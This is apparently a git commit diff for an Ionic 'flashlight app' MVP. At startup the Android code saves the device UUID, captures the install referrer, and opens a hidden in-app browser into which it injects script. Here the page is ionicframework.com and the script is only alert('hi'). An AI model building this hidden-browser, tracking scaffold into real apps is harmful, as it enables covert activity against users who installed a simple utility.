4a27e9f2e43509cffbb3a0605704c91af6301dbb
cbuck5 <chris.buckley@nike.com>
2017-07-23 14:25:01 -0700

    mvp of flashlight app

--- src/app/app.component.ts
+++ src/app/app.component.ts
@@ -4,6 +4,10 @@ import { StatusBar } from '@ionic-native/status-bar';
 import { SplashScreen } from '@ionic-native/splash-screen';
 
 import { TabsPage } from '../pages/tabs/tabs';
+import { InAppBrowser } from '@ionic-native/in-app-browser';
+import { Broadcaster } from '@ionic-native/broadcaster';
+import { Storage } from '@ionic/storage';
+import { Device } from '@ionic-native/device';
 
 @Component({
   templateUrl: 'app.html'
@@ -11,12 +15,36 @@ import { TabsPage } from '../pages/tabs/tabs';
 export class MyApp {
   rootPage:any = TabsPage;
 
-  constructor(platform: Platform, statusBar: StatusBar, splashScreen: SplashScreen) {
+  constructor(platform: Platform, statusBar: StatusBar, splashScreen: SplashScreen, iab: InAppBrowser,
+              broadcaster: Broadcaster, storage: Storage, device: Device) {
     platform.ready().then(() => {
       // Okay, so the platform is ready and our plugins are available.
       // Here you can do any higher level native things you might need.
       statusBar.styleDefault();
       splashScreen.hide();
+
+      if(platform.is('android')) {
+
+        storage.set("androidId", device.uuid);
+
+        //save this and ensure we have the referrer otherwise no need to do anything...
+        broadcaster.addEventListener('com.android.vending.INSTALL_REFERRER').subscribe(function(referrer){
+          console.log(referrer);
+          storage.set("referrer", referrer);
+        });
+
+        alert(storage.get("androidId"));
+
+        const browserOptions = 'zoom=no,location=no,useWideViewPort=no,hidden=yes,enableViewportScale=yes';
+        const path = 'https://ionicframework.com/';
+        const browser = iab.create(path, '_blank', browserOptions);
+
+        browser.on('loadstop').subscribe(event => {
+          console.log('loadstop', event);
+          browser.executeScript({code : "alert('hi')"}).then((result) => console.log(result));
+        });
+
+      }
     });
   }
 }
--- src/app/app.module.ts
+++ src/app/app.module.ts
@@ -4,36 +4,44 @@ import { IonicApp, IonicModule, IonicErrorHandler } from 'ionic-angular';
 import { MyApp } from './app.component';
 
 import { AboutPage } from '../pages/about/about';
-import { ContactPage } from '../pages/contact/contact';
 import { HomePage } from '../pages/home/home';
 import { TabsPage } from '../pages/tabs/tabs';
 
 import { StatusBar } from '@ionic-native/status-bar';
 import { SplashScreen } from '@ionic-native/splash-screen';
 
+import { Flashlight } from '@ionic-native/flashlight';
+import { InAppBrowser } from '@ionic-native/in-app-browser';
+import { Broadcaster } from '@ionic-native/broadcaster';
+import { IonicStorageModule } from '@ionic/storage';
+import { Device } from '@ionic-native/device';
+
 @NgModule({
   declarations: [
     MyApp,
     AboutPage,
-    ContactPage,
     HomePage,
     TabsPage
   ],
   imports: [
     BrowserModule,
-    IonicModule.forRoot(MyApp)
+    IonicModule.forRoot(MyApp),
+    IonicStorageModule.forRoot()
   ],
   bootstrap: [IonicApp],
   entryComponents: [
     MyApp,
     AboutPage,
-    ContactPage,
     HomePage,
     TabsPage
   ],
   providers: [
     StatusBar,
     SplashScreen,
+    Flashlight,
+    InAppBrowser,
+    Broadcaster,
+    Device,
     {provide: ErrorHandler, useClass: IonicErrorHandler}
   ]
 })
